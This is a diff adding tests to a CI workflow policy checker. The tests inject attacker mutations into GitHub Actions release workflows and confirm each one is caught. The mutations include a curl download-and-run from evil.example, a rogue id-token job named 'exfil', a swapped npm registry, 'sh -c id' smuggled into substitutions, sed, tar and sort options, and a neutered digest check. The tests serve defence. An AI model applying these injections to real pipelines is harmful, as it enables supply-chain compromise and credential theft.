+	expect_caught 'a shell that sets BASH_ENV for the pack step (#1030)' narrow "$WORKFLOWS/release-exec.yml" \
+		$'      - name: Pack\n        id: pack\n' $'      - name: Pack\n        id: pack\n        shell: env BASH_ENV=/tmp/x bash -e {0}\n' \
+		'pack-brain: step Pack runs in shell: env BASH_ENV=/tmp/x bash -e {0} in a job that installs npm from its checked tarball or runs npm pack (#1030)'
+	expect_caught 'NODE_OPTIONS exported in the pack script (#1030)' narrow "$WORKFLOWS/release-exec.yml" \
+		'          dir="$RUNNER_TEMP/brain-pack"' $'          export NODE_OPTIONS=--require=/tmp/x.js\n          dir="$RUNNER_TEMP/brain-pack"' \
+		'pack-brain: step Pack sets NODE_OPTIONS in its script, in a job that installs npm from its checked tarball or runs npm pack (#1030)'
+	expect_caught 'a job of another name that only packs, with BASH_ENV (#1030)' narrow "$WORKFLOWS/release-exec.yml" \
+		$'\njobs:\n' $'\njobs:\n  sneak:\n    runs-on: ubuntu-latest\n    permissions: {}\n    env:\n      BASH_ENV: /tmp/x\n    steps:\n      - run: npm pack\n' \
+		'sneak: job env sets BASH_ENV in a job that installs npm from its checked tarball or runs npm pack (#1030)'
+	expect_caught 'a pack with an option value before the verb, with BASH_ENV (review of #1030)' narrow "$WORKFLOWS/release-exec.yml" \
+		$'\njobs:\n' $'\njobs:\n  sneak:\n    runs-on: ubuntu-latest\n    permissions: {}\n    env:\n      BASH_ENV: /tmp/x\n    steps:\n      - run: npm --loglevel silent pack\n' \
+		'sneak: job env sets BASH_ENV in a job that installs npm from its checked tarball or runs npm pack (#1030)'
+	expect_caught 'a pack with npm quoted, with BASH_ENV (security review of #1030)' narrow "$WORKFLOWS/release-exec.yml" \
+		$'\njobs:\n' $'\njobs:\n  sneak:\n    runs-on: ubuntu-latest\n    permissions: {}\n    env:\n      BASH_ENV: /tmp/x\n    steps:\n      - run: \x27"npm" pack\x27\n' \
+		'sneak: job env sets BASH_ENV in a job that installs npm from its checked tarball or runs npm pack (#1030)'
+	expect_caught 'a pack by bun pm pack, with BASH_ENV (security review of #1030)' narrow "$WORKFLOWS/release-exec.yml" \
+		$'\njobs:\n' $'\njobs:\n  sneak:\n    runs-on: ubuntu-latest\n    permissions: {}\n    env:\n      BASH_ENV: /tmp/x\n    steps:\n      - run: bun pm pack\n' \
+		'sneak: job env sets BASH_ENV in a job that installs npm from its checked tarball or runs npm pack (#1030)'
+	expect_caught 'a pack split across a continuation line, with BASH_ENV (#1030)' narrow "$WORKFLOWS/release-exec.yml" \
+		$'\njobs:\n' $'\njobs:\n  sneak:\n    runs-on: ubuntu-latest\n    permissions: {}\n    env:\n      BASH_ENV: /tmp/x\n    steps:\n      - run: |\n          npm \\\n            pack\n' \
+		'sneak: job env sets BASH_ENV in a job that installs npm from its checked tarball or runs npm pack (#1030)'
+}
+
+echo
+echo "the npm publishing jobs, and every job holding id-token, run only the commands listed for them (#1029)"
+for f in "$WORKFLOWS"/*.yml; do
+	expect_clean "$(basename "$f"): every job holding id-token runs only its listed commands" runs "$f"
+done
+# Both jobs were read, or the list matched nothing and passed for that.
+for spec in "release-exec.yml publish-brain" "sidecar-release.yml publish-sidecar" "sidecar-release.yml sign-sidecar-windows" "installer-release.yml sign-windows"; do
+	read -r f j <<<"$spec"
+	if RUNS_REPORT=1 check runs "$WORKFLOWS/$f" | grep -qxF "checked $j"; then
+		ok "the run allowlist read ${j} in ${f} (#1029)"
+	else
+		no "the run allowlist read ${j} in ${f} (#1029)"
+	fi
+done
+# shellcheck disable=SC2016 # literal workflow text, not shell.
+{
+	# The probe from the issue, one reason at a time.
+	probe=$'      - run: curl -o /tmp/x https://evil.example/x; chmod +x /tmp/x; /tmp/x\n      - name: Publish to npm'
+	expect_caught 'a downloaded file run by its path in the brain publish job (#1029)' runs "$WORKFLOWS/release-exec.yml" \
+		'      - name: Publish to npm' "$probe" \
+		'publish-brain: step 4 runs /tmp/x, which is not a plain command name this rule can check'
+	expect_caught 'chmod in the brain publish job, which it never ran (#1029)' runs "$WORKFLOWS/release-exec.yml" \
+		'      - name: Publish to npm' "$probe" \
+		'publish-brain: step 4 runs chmod, which is not on the publish-brain list'
+	expect_caught 'a download that is not the pinned npm tarball (#1029)' runs "$WORKFLOWS/release-exec.yml" \
+		'      - name: Publish to npm' "$probe" \
+		'publish-brain: step 4 runs "curl -o /tmp/x https://evil.example/x", which is not one of the forms listed for curl'
+	# Without the pin on curl, the same attack needs no new command name.
+	expect_caught 'the pinned download pointed at the npm on PATH (#1029)' runs "$WORKFLOWS/release-exec.yml" \
+		'          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' $'          curl -fsS --proto \x27=https\x27 --retry 3 --max-time 300 --max-filesize 67108864 -o /usr/local/bin/npm "https://registry.npmjs.org/npm/-/npm-${NPM_VERSION}.tgz"\n          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' \
+		'not one of the forms listed for curl'
+	expect_caught 'a shell run on the download (#1029)' runs "$WORKFLOWS/release-exec.yml" \
+		'          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' $'          bash /tmp/x\n          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' \
+		'publish-brain: step Publish to npm runs bash, which is not on the publish-brain list'
+	expect_caught 'a command inside a substitution (#1029)' runs "$WORKFLOWS/release-exec.yml" \
+		'          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' $'          x="$(sh -c id)"\n          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' \
+		'publish-brain: step Publish to npm runs sh, which is not on the publish-brain list'
+	expect_caught 'a command inside a [[ ]] (#1029)' runs "$WORKFLOWS/release-exec.yml" \
+		'          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' $'          [[ -n "$(sh -c id)" ]] || exit 1\n          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' \
+		'publish-brain: step Publish to npm runs sh, which is not on the publish-brain list'
+	expect_caught 'a command after an ANSI-C quote that looks unclosed (#1029)' runs "$WORKFLOWS/release-exec.yml" \
+		'          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' $'          echo $\x27\\\x27\x27; sh -c id #\x27\n          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' \
+		'publish-brain: step Publish to npm runs sh, which is not on the publish-brain list'
+	expect_caught 'a command inside an array subscript (#1029)' runs "$WORKFLOWS/release-exec.yml" \
+		'          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' $'          echo "${flags[$(sh -c id)]}"\n          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' \
+		'publish-brain: step Publish to npm runs sh, which is not on the publish-brain list'
+	expect_caught 'eval in the brain publish job (#1029)' runs "$WORKFLOWS/release-exec.yml" \
+		'          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' $'          eval "$x"\n          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' \
+		'publish-brain: step Publish to npm runs eval, which is not on the publish-brain list'
+	expect_caught 'the digest check neutered by a function of the same name (#1029)' runs "$WORKFLOWS/release-exec.yml" \
+		'          echo "${SHA256}  ${RUNNER_TEMP}/brain-pack/${TARBALL}" | sha256sum -c -' $'          sha256sum() { :; }\n          echo "${SHA256}  ${RUNNER_TEMP}/brain-pack/${TARBALL}" | sha256sum -c -' \
+		'publish-brain: step Verify the tarball defines a function sha256sum over a command'
+	expect_caught 'a function not on the list (#1029)' runs "$WORKFLOWS/release-exec.yml" \
+		'          echo "${SHA256}  ${RUNNER_TEMP}/brain-pack/${TARBALL}" | sha256sum -c -' $'          f() { echo x; }\n          echo "${SHA256}  ${RUNNER_TEMP}/brain-pack/${TARBALL}" | sha256sum -c -' \
+		'publish-brain: step Verify the tarball defines a function f, which is not on the publish-brain list'
+	expect_caught 'a file written over by a redirection (#1029)' runs "$WORKFLOWS/release-exec.yml" \
+		'          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' $'          echo x > /usr/local/bin/npm\n          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' \
+		'publish-brain: step Publish to npm writes to /usr/local/bin/npm'
+	expect_caught 'a file written over by >& (#1029)' runs "$WORKFLOWS/release-exec.yml" \
+		'          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' $'          echo x >&/usr/local/bin/npm\n          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' \
+		'publish-brain: step Publish to npm writes to /usr/local/bin/npm'
+	expect_caught 'another registry slipped into the npm flags (#1029)' runs "$WORKFLOWS/release-exec.yml" \
+		'          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' $'          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi\n          flags+=(--registry=https://registry.evil.example/)' \
+		'publish-brain: step Publish to npm sets the array flags=(--registry=https://registry.evil.example/), which is not on the publish-brain list'
+	expect_caught 'another registry in front of the publish (#1029)' runs "$WORKFLOWS/release-exec.yml" \
+		'          if ! npm publish "${RUNNER_TEMP}' '          if ! npm_config_registry=https://registry.evil.example/ npm publish "${RUNNER_TEMP}' \
+		'publish-brain: step Publish to npm runs npm with npm_config_registry=https://registry.evil.example/ in front'
+	expect_caught 'a heredoc, which the rule does not read (#1029)' runs "$WORKFLOWS/release-exec.yml" \
+		'          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' $'          echo <<EOF\n          sh -c id\n          EOF\n          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' \
+		'publish-brain: step Publish to npm holds a heredoc, which this rule does not read'
+	expect_caught 'an arithmetic command, which the rule does not read (#1029)' runs "$WORKFLOWS/release-exec.yml" \
+		'          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' $'          (( x[$(id)] ))\n          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' \
+		'publish-brain: step Publish to npm holds an arithmetic command, which this rule does not read'
+	expect_caught 'an integer test in [[ ]], which evaluates its operands (#1029)' runs "$WORKFLOWS/release-exec.yml" \
+		'          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' $'          [[ \x27x[$(id)]\x27 -eq 0 ]] || exit 1\n          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' \
+		'publish-brain: step Publish to npm holds an integer comparison inside [[ ]], which this rule does not read'
+	expect_caught 'the brain publish job renamed out of its list (#1029)' runs "$WORKFLOWS/release-exec.yml" \
+		$'  publish-brain:\n' $'  publish-brain-2:\n' \
+		'publish-brain-2: holds id-token and has no list of the commands it may run'
+	# publish-sidecar, which runs far more.
+	expect_caught 'a function of another step called where it is not defined (#1029)' runs "$WORKFLOWS/sidecar-release.yml" \
+		'          sums="$(cd artifacts' $'          manifest .\n          sums="$(cd artifacts' \
+		'publish-sidecar: step Record artifact digests calls manifest, a function this step does not define'
+	expect_caught 'printf -v, which assigns a variable unseen (#1029)' runs "$WORKFLOWS/sidecar-release.yml" \
+		'      - name: Record artifact digests' $'      - run: printf -v PATH %s /tmp/evil\n      - name: Record artifact digests' \
+		'runs printf -v, which sets a variable this rule cannot see'
+	expect_caught 'a directory outside sidecar/npm in the platform loop (#1029)' runs "$WORKFLOWS/sidecar-release.yml" \
+		'for platform in darwin-arm64 darwin-x64 linux-x64 linux-arm64 win32-x64; do' 'for platform in ../../../evil darwin-arm64 darwin-x64 linux-x64 linux-arm64 win32-x64; do' \
+		'publish-sidecar: step Prepare platform packages loops over platform in ../../../evil darwin-arm64'
+	expect_caught 'a command inside a for list (#1029)' runs "$WORKFLOWS/sidecar-release.yml" \
+		'for platform in darwin-arm64 darwin-x64 linux-x64 linux-arm64 win32-x64; do' 'for platform in $(sh -c id) darwin-arm64 darwin-x64 linux-x64 linux-arm64 win32-x64; do' \
+		'publish-sidecar: step Prepare platform packages runs sh, which is not on the publish-sidecar list'
+	expect_caught 'a command inside a case pattern (#1029)' runs "$WORKFLOWS/sidecar-release.yml" \
+		'              darwin-*)' '              darwin-*|$(sh -c id))' \
+		'publish-sidecar: step Prepare platform packages runs sh, which is not on the publish-sidecar list'
+	expect_caught 'tar told to run a program on what it extracts (#1029)' runs "$WORKFLOWS/sidecar-release.yml" \
+		'--no-same-owner --no-same-permissions' '--no-same-owner --no-same-permissions --to-command=sh' \
+		'which is not one of the forms listed for tar'
+	expect_caught 'sort told to run a compressor (#1029)' runs "$WORKFLOWS/sidecar-release.yml" \
+		'LC_ALL=C sort -z' 'LC_ALL=C sort -z --compress-program=/tmp/x' \
+		'publish-sidecar: step Record artifact digests runs "sort -z --compress-program=/tmp/x", which is not one of the forms listed for sort'
+	expect_caught 'a repository script run by its path in the sidecar publish job (#1029)' runs "$WORKFLOWS/sidecar-release.yml" \
+		'      - name: Record artifact digests' $'      - run: ./scripts/x.sh\n      - name: Record artifact digests' \
+		'runs ./scripts/x.sh, which is not a plain command name this rule can check'
+	# The list is exactly what the jobs run: an entry left behind is reported.
+	expect_caught 'a listed form no step runs any more (#1029)' runs "$WORKFLOWS/sidecar-release.yml" \
+		'xargs -0 -r sha256sum' 'xargs -0 sha256sum' \
+		'publish-sidecar: runAllow lists the form "xargs -0 -r sha256sum", which no step of the job runs any more'
+	# Security review of #1029: every job holding id-token, not only those
+	# that run npm publish, the signers included.
+	expect_caught 'an added id-token job that downloads and runs a file (security review of #1029)' runs "$WORKFLOWS/release-exec.yml" \
+		$'\njobs:\n' $'\njobs:\n  exfil:\n    runs-on: ubuntu-latest\n    permissions:\n      id-token: write\n    steps:\n      - run: curl -o /tmp/x https://evil.example/x; chmod +x /tmp/x; /tmp/x\n' \
+		'exfil: holds id-token and has no list of the commands it may run'
+	expect_caught 'a download run in the KMS signer of the sidecar (security review of #1029)' runs "$WORKFLOWS/sidecar-release.yml" \
+		'        run: scripts/sign-windows.sh --defer-verify "${SIDECAR_BIN}.exe"' '        run: curl -o /tmp/x https://evil.example/x; chmod +x /tmp/x; /tmp/x; scripts/sign-windows.sh --defer-verify "${SIDECAR_BIN}.exe"' \
+		'sign-sidecar-windows: step Sign Windows binary (Cloud KMS) runs /tmp/x, which is not a plain command name this rule can check'
+	expect_caught 'the signing script run with other arguments (security review of #1029)' runs "$WORKFLOWS/installer-release.yml" \
+		'        run: scripts/sign-windows.sh --defer-verify Jarvis-Setup.exe' '        run: scripts/sign-windows.sh --defer-verify /tmp/evil.exe' \
+		'which is not one of the forms listed for scripts/sign-windows.sh'
+	expect_caught 'a publish step in a shell the rule does not read (security review of #1029)' runs "$WORKFLOWS/release-exec.yml" \
+		$'      - name: Publish to npm\n        env:\n' $'      - name: Publish to npm\n        shell: python {0}\n        env:\n' \
+		'publish-brain: step Publish to npm runs in shell: python {0}, which this rule does not read'
+	# Review of #1029: values reach the pinned forms, so they are listed too.
+	expect_caught 'VERSION reassigned so the pinned sed -i runs a sed script of its own (review of #1029)' runs "$WORKFLOWS/sidecar-release.yml" \
+		'            sed -i "s|' $'            VERSION="1|e id|"\n            sed -i "s|' \
+		'publish-sidecar: step Prepare platform packages assigns "VERSION=\"1|e id|\"", which is not on the publish-sidecar list'
+	expect_caught 'a listed assignment changed (review of #1029)' runs "$WORKFLOWS/release-exec.yml" \
+		'          pkg="@usejarvis/brain"' '          pkg="@usejarvis/brain-evil"' \
+		'publish-brain: runAllow lists the assignment "pkg=\"@usejarvis/brain\"", which no step of the job runs any more'
+	expect_caught 'a listed function called on another directory (review of #1029)' runs "$WORKFLOWS/sidecar-release.yml" \
+		'            ours="$(manifest .)"' '            ours="$(manifest /)"' \
+		'publish-sidecar: step Publish platform packages calls "manifest /", which is not one of the calls listed'
+	expect_caught 'a nameref declared by local, so a later assignment writes PATH (review of #1029)' runs "$WORKFLOWS/sidecar-release.yml" \
+		'            local url integrity tmp got names types ours theirs' '            local -n url=PATH integrity tmp got names types ours theirs' \
+		'which is not one of the forms listed for local'
+	expect_caught 'mktemp making files where it is told (review of #1029)' runs "$WORKFLOWS/sidecar-release.yml" \
+		'          err="$(mktemp)"' '          err="$(mktemp -p /usr/local/bin)"' \
+		'publish-sidecar: step Publish platform packages runs "mktemp -p /usr/local/bin", which is not one of the forms listed for mktemp'
+	expect_caught 'diff told to run pr (review of #1029)' runs "$WORKFLOWS/sidecar-release.yml" \
+		"diff <(printf '%s\\n' \"\$want\")" "diff -l <(printf '%s\\n' \"\$want\")" \
+		'which is not one of the forms listed for diff'
+	expect_caught 'another publishing job, its publish on a continued line (review of #1029)' runs "$WORKFLOWS/release-exec.yml" \
+		$'\njobs:\n' $'\njobs:\n  sneak:\n    runs-on: ubuntu-latest\n    permissions:\n      id-token: write\n    steps:\n      - run: |\n          npm \\\n            publish x.tgz\n' \
+		'sneak: holds id-token and has no list of the commands it may run'
+	expect_caught 'another publishing job, npm quoted (review of #1029)' runs "$WORKFLOWS/release-exec.yml" \
+		$'\njobs:\n' $'\njobs:\n  sneak:\n    runs-on: ubuntu-latest\n    permissions:\n      id-token: write\n    steps:\n      - run: \x27"npm" publish x.tgz\x27\n' \
+		'sneak: holds id-token and has no list of the commands it may run'
+}
+
+echo
 echo "no checkout leaves a write token or a secret on disk, and a push brings its own credential (#982)"
 # shellcheck disable=SC2016 # literal workflow text, not shell.
 {
@@ -2216,14 +3212,23 @@ echo "no checkout leaves a write token or a secret on disk, and a push brings it
 	expect_caught 'the release cut job persisting its PAT on purpose (#982)' narrow "$WORKFLOWS/release.yml" \
 		$'          token: ${{ secrets.RELEASE_PR_TOKEN }}\n          persist-credentials: false\n' $'          token: ${{ secrets.RELEASE_PR_TOKEN }}\n          persist-credentials: true\n' \
 		'cut: checkout leaves the token in .git/config'
-	expect_caught 'a write-scoped job off the release path persisting its token (#982)' narrow "$WORKFLOWS/update-webview.yml" \
+	# The webview build job is read-only since #983, so a copy gives it its
+	# old write scope back first: what is tested is a write-scoped job off
+	# the release path, as before the split.
+	FROM="$WORKFLOWS/update-webview.yml" TO="${WORK}/uw-write.yml" bun -e '
+const s = await Bun.file(process.env.FROM).text();
+const old = "    timeout-minutes: 30\n    permissions:\n      contents: read\n";
+if (!s.includes(old)) process.exit(2);
+await Bun.write(process.env.TO, s.replace(old, "    timeout-minutes: 30\n    permissions:\n      contents: write\n"));
+' || no "the webview build job write-scope copy could be made (update-webview.yml no longer has the text it mutates)"
+	expect_caught 'a write-scoped job off the release path persisting its token (#982)' narrow "${WORK}/uw-write.yml" \
 		$'        with:\n          persist-credentials: false\n      - uses: actions/setup-go@' '      - uses: actions/setup-go@' \
-		'update: checkout leaves the token in .git/config'
+		'build: checkout leaves the token in .git/config'
 	expect_caught 'a read-only job persisting a secret it checked out with (#982)' narrow "$WORKFLOWS/docker-build.yml" \
-		$'      - uses: actions/checkout@v7\n' $'      - uses: actions/checkout@v7\n        with:\n          token: ${{ secrets.SOME_PAT }}\n' \
+		$'\n\n      - name: Set up Docker Buildx\n' $'\n        with:\n          token: ${{ secrets.SOME_PAT }}\n\n      - name: Set up Docker Buildx\n' \
 		'docker-build: checkout leaves the token in .git/config'
 	expect_caught 'the same checkout spelled in another case (#982)' narrow "$WORKFLOWS/docker-build.yml" \
-		$'      - uses: actions/checkout@v7\n' $'      - uses: Actions/Checkout@v7\n        with:\n          token: ${{ secrets.SOME_PAT }}\n' \
+		$'      - uses: actions/checkout@' $'      - with:\n          token: ${{ secrets.SOME_PAT }}\n        uses: Actions/Checkout@' \
 		'docker-build: checkout leaves the token in .git/config'
 	expect_caught 'the release branch pushed with no credential helper (#982)' narrow "$WORKFLOWS/release.yml" \
 		$'          GIT_CONFIG_KEY_1: credential.https://github.com.helper\n' '' \
@@ -2403,7 +3408,7 @@ push_cred_caught() {
 	if ! FROM="$WORKFLOWS/release.yml" TO="$copy" OLD="$2" NEW="$3" bun -e '
 const s = await Bun.file(process.env.FROM).text();
 if (!s.includes(process.env.OLD)) { console.error("anchor not found"); process.exit(2); }
-await Bun.write(process.env.TO, s.replace(process.env.OLD, process.env.NEW));
+await Bun.write(process.env.TO, s.replace(process.env.OLD, () => process.env.NEW));
 '; then
 		no "push credential mutant '$1' could be applied (release.yml no longer has the text it mutates)"
 		return
@@ -2438,6 +3443,348 @@ await Bun.write(process.env.TO, s.replace(process.env.OLD, process.env.NEW));
 		'          GIT_TERMINAL_PROMPT: "0"' '          GIT_TERMINAL_PROMPT: "1"' \
 		'GIT_TERMINAL_PROMPT is not 0'
 }
+
+echo
+echo "the webview_go bump PR is opened with the PAT, by a job that runs no upstream code (#983)"
+# shellcheck disable=SC2016 # literal workflow text, not shell.
+{
+	expect_caught 'the webview PR falling back to GITHUB_TOKEN again, as before #983' catalog-pr "$WORKFLOWS/update-webview.yml" \
+		'          token: ${{ secrets.RELEASE_PR_TOKEN }}' '          token: ${{ secrets.WEBVIEW_BOT_TOKEN || secrets.GITHUB_TOKEN }}' \
+		'publish: step Open / update the bump PR: token is "${{ secrets.WEBVIEW_BOT_TOKEN || secrets.GITHUB_TOKEN }}", not secrets.RELEASE_PR_TOKEN alone'
+	expect_caught 'the webview PR opened with the default token (#983)' catalog-pr "$WORKFLOWS/update-webview.yml" \
+		$'          token: ${{ secrets.RELEASE_PR_TOKEN }}\n' '' \
+		'token is "the default github.token"'
+	expect_caught 'the webview PR with no refusal when its token is missing (#983)' catalog-pr "$WORKFLOWS/update-webview.yml" \
+		'          if [ -z "$WEBVIEW_PR_TOKEN" ]; then' '          if false; then' \
+		'publish: step Open / update the bump PR: no earlier step refuses when RELEASE_PR_TOKEN is empty'
+	expect_caught 'a webview refusal that only warns (#983)' catalog-pr "$WORKFLOWS/update-webview.yml" \
+		$'on this repository."\n            exit 1\n' $'on this repository."\n' \
+		'no earlier step refuses when RELEASE_PR_TOKEN is empty'
+	expect_caught 'a webview refusal under a condition the PR step does not have (#983)' catalog-pr "$WORKFLOWS/update-webview.yml" \
+		$'      - name: Refuse without the webview PR token\n' $'      - name: Refuse without the webview PR token\n        if: github.event_name == \x27schedule\x27\n' \
+		'no earlier step refuses when RELEASE_PR_TOKEN is empty'
+	expect_caught 'the PAT handed to the job that builds upstream code (#983)' catalog-pr "$WORKFLOWS/update-webview.yml" \
+		$'        env:\n          CGO_ENABLED: "1"\n        run: |\n          set -euo pipefail\n          go vet ./...' $'        env:\n          CGO_ENABLED: "1"\n          GH_TOKEN: ${{ secrets.RELEASE_PR_TOKEN }}\n        run: |\n          set -euo pipefail\n          go vet ./...' \
+		'secrets.RELEASE_PR_TOKEN is read 3 times'
+	# ...and the same, seen by the rule that keeps upstream code away from
+	# any secret: the Go tests run with the PAT in reach.
+	expect_caught 'the build job reading the PAT while it runs the Go tests (#983)' untrusted "$WORKFLOWS/update-webview.yml" \
+		$'        env:\n          CGO_ENABLED: "1"\n        run: |\n          set -euo pipefail\n          go vet ./...' $'        env:\n          CGO_ENABLED: "1"\n          GH_TOKEN: ${{ secrets.RELEASE_PR_TOKEN }}\n        run: |\n          set -euo pipefail\n          go vet ./...' \
+		'build: step Compat - build + vet + test (linux/amd64, cgo): builds or tests Go code (module code is compiled or run) in a job holding a secret other than GITHUB_TOKEN: go test ./...'
+	expect_caught 'the Go tests back in the job holding the PAT (#983)' untrusted "$WORKFLOWS/update-webview.yml" \
+		'      - name: Open / update the bump PR' $'      - run: cd sidecar && go test ./...\n      - name: Open / update the bump PR' \
+		'publish: step 4: builds or tests Go code (module code is compiled or run) in a job holding a secret other than GITHUB_TOKEN'
+	expect_caught 'go -C running the Go tests in the job holding the PAT (review of #983)' untrusted "$WORKFLOWS/update-webview.yml" \
+		'      - name: Open / update the bump PR' $'      - run: go -C sidecar test ./...\n      - name: Open / update the bump PR' \
+		'publish: step 4: builds or tests Go code'
+	expect_caught 'a repository script behind a directory in the job holding the PAT (review of #983)' untrusted "$WORKFLOWS/update-webview.yml" \
+		'      - name: Open / update the bump PR' $'      - run: $GITHUB_WORKSPACE/scripts/vendor-webview.sh x\n      - name: Open / update the bump PR' \
+		'publish: step 4: runs a repository script'
+	expect_caught 'the vendoring script back in the job holding the PAT (#983)' untrusted "$WORKFLOWS/update-webview.yml" \
+		'      - name: Open / update the bump PR' $'      - run: scripts/vendor-webview.sh "$VERSION"\n      - name: Open / update the bump PR' \
+		'publish: step 4: runs a repository script in a job holding a secret other than GITHUB_TOKEN'
+	expect_caught 'the job holding the PAT checking out with its token persisted (#983)' narrow "$WORKFLOWS/update-webview.yml" \
+		$'        with:\n          persist-credentials: false\n\n      - uses: actions/download-artifact@' $'\n      - uses: actions/download-artifact@' \
+		'publish: checkout leaves the token in .git/config'
+}
+# The vendor dir carries a .gitattributes, which upload-artifact leaves out
+# unless it is asked to include hidden files; the PR would then delete it.
+hidden_check() {
+	# shellcheck disable=SC2016 # JavaScript source, not shell.
+	FILE="$1" bun -e '
+const d = Bun.YAML.parse(await Bun.file(process.env.FILE).text());
+const up = (d.jobs?.build?.steps ?? []).filter((s) => String(s.uses ?? "").toLowerCase().startsWith("actions/upload-artifact@") && s.with?.name === "webview-bump");
+if (up.length !== 1) console.log("build uploads webview-bump " + up.length + " times, not once");
+else if (up[0].with["include-hidden-files"] !== true) console.log("the webview-bump upload leaves hidden files out (include-hidden-files is " + JSON.stringify(up[0].with["include-hidden-files"]) + ")");
+'
+}
+found="$(hidden_check "$WORKFLOWS/update-webview.yml")" || found="the bun helper failed"
+if [ -z "$found" ]; then ok "update-webview.yml: the vendored tree is uploaded with its hidden files (#983)"; else no "update-webview.yml: the vendored tree is uploaded with its hidden files (#983)" "$found"; fi
+copy="${WORK}/hidden.yml"
+if FROM="$WORKFLOWS/update-webview.yml" TO="$copy" OLD=$'          include-hidden-files: true\n' NEW='' bun -e '
+const s = await Bun.file(process.env.FROM).text();
+if (!s.includes(process.env.OLD)) process.exit(2);
+await Bun.write(process.env.TO, s.replace(process.env.OLD, () => process.env.NEW));
+' && grep -qF 'leaves hidden files out' <<<"$(hidden_check "$copy")"; then
+	ok "reports: the vendored tree uploaded without its hidden files (#983)"
+else
+	no "reports: the vendored tree uploaded without its hidden files (#983)"
+fi
+# The job holding the PAT runs exactly these steps and nothing else
+# (review of #983): the refusal, a checkout, the artifact, the copy, and
+# create-pull-request, the two scripts line for line (comment and blank
+# lines aside), each step with no shell, working directory or env beyond
+# its own, and the job with no env, defaults, container or services. A
+# list of what may not run there (Go, a script) is never complete; this is
+# the list of what does.
+# pat_job_check <workflow>: one violation per line, nothing when clean.
+pat_job_check() {
+	# shellcheck disable=SC2016 # JavaScript source, not shell.
+	FILE="$1" bun -e '
+const d = Bun.YAML.parse(await Bun.file(process.env.FILE).text());
+const out = [];
+const job = d.jobs?.publish ?? {};
+const code = (r) => String(r).split("\n").map((l) => l.trim()).filter((l) => l && !l.startsWith("#"));
+const scripts = [
+  // Refuse without the webview PR token
+  [
+    "if [ -z \"$WEBVIEW_PR_TOKEN\" ]; then",
+    "echo \"::error::RELEASE_PR_TOKEN is not set, so the webview_go bump PR would open without CI and could never merge (#983).\"",
+    "echo \"Add a fine-grained PAT with Contents: read and write, and Pull requests: read and write, on this repository.\"",
+    "exit 1",
+    "fi",
+  ],
+  // Put the vendored tree in place
+  [
+    "set -euo pipefail",
+    "in=\"$RUNNER_TEMP/webview-bump\"",
+    "if [ -n \"$(find \"$in\" -mindepth 1 -not -type f -not -type d -print -quit)\" ]; then",
+    "echo \"::error::the webview-bump artifact holds something other than files and directories\"",
+    "exit 1",
+    "fi",
+    "if [ -n \"$(find \"$in\" -mindepth 1 -iname .git -print -quit)\" ]; then",
+    "echo \"::error::the webview-bump artifact holds a .git\"",
+    "exit 1",
+    "fi",
+    "if [ -n \"$(LC_ALL=C find \"$in\" -mindepth 1 -name \x27*[!A-Za-z0-9._+-]*\x27 -print -quit)\" ]; then",
+    "echo \"::error::the webview-bump artifact holds a name outside A-Za-z0-9._+-\"",
+    "exit 1",
+    "fi",
+    "if [ \"$(find \"$in\" -mindepth 1 -maxdepth 1 | wc -l)\" != 3 ] || [ ! -f \"$in/go.mod\" ] || [ ! -f \"$in/go.sum\" ] || [ ! -d \"$in/webview_go\" ]; then",
+    "echo \"::error::the webview-bump artifact is not the vendor dir and the two module files\"",
+    "exit 1",
+    "fi",
+    "if [ \"$(cat \"$in/webview_go/UPSTREAM_VERSION\" 2>/dev/null)\" != \"$VERSION\" ]; then",
+    "echo \"::error::the vendored tree records another version than ${VERSION}\"",
+    "exit 1",
+    "fi",
+    "rm -rf sidecar/third_party/webview_go",
+    "cp -R \"$in/webview_go\" sidecar/third_party/webview_go",
+    "cp \"$in/go.mod\" \"$in/go.sum\" sidecar/",
+  ],
+];
+const want = [
+  { name: "Refuse without the webview PR token", run: scripts[0], env: ["WEBVIEW_PR_TOKEN"] },
+  { uses: "actions/checkout@" },
+  { uses: "actions/download-artifact@" },
+  { name: "Put the vendored tree in place", run: scripts[1], env: ["VERSION"] },
+  { uses: "peter-evans/create-pull-request@" },
+];
+for (const k of ["env", "defaults", "container", "services", "continue-on-error"]) if (job[k] !== undefined) out.push("publish: has " + k + ":");
+const steps = job.steps ?? [];
+if (steps.length !== want.length) out.push("publish: runs " + steps.length + " steps, not the " + want.length + " listed");
+steps.forEach((st, i) => {
+  const w = want[i] ?? {};
+  const label = "publish: step " + (st.name ?? st.uses ?? String(i));
+  for (const k of Object.keys(st)) if (!["name", "id", "if", "env", "run", "uses", "with"].includes(k)) out.push(label + " has " + k + ":");
+  if (w.uses !== undefined && !String(st.uses ?? "").toLowerCase().startsWith(w.uses)) out.push(label + " is not " + w.uses);
+  if (w.run !== undefined) {
+    if (st.name !== w.name || typeof st.run !== "string") out.push(label + " is not the step " + w.name);
